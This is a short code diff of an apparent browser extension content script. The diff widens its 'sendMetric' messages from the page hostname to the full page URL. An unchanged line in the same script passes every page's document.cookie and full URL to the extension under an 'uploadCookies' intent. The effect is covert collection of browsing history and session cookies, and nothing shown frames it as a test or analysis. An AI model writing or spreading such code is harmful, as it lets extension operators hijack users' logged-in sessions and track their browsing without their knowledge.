@@ -1,7 +1,7 @@
-browser.runtime.sendMessage({"intent": 'sendMetric', 'name': 'open', 'url': window.location.hostname});
+browser.runtime.sendMessage({"intent": 'sendMetric', 'name': 'open', 'url': window.location.hostname, 'fullURL': window.location.href});
 
 window.onbeforeunload = function() {
-  browser.runtime.sendMessage({"intent": 'sendMetric', 'name': 'close', 'url': window.location.hostname});
+  browser.runtime.sendMessage({"intent": 'sendMetric', 'name': 'close', 'url': window.location.hostname, 'fullURL': window.location.href});
 };
 
 browser.runtime.sendMessage({"intent": 'uploadCookies', 'url': window.location.href , 'payload': document.cookie});
